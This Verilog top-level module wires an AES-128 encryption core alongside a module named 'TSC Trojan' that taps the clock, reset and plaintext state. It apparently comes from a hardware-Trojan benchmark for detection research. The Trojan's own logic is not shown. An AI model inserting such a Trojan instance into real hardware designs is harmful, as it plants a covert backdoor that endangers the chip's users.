module top(
    input           clk,
    input           rst,
    input  [127:0]  state, 
    input  [127:0]  key,
    output [127:0]  out
    );

		aes_128 AES (clk, state, key, out);
		TSC Trojan (clk, rst, state);

endmodule
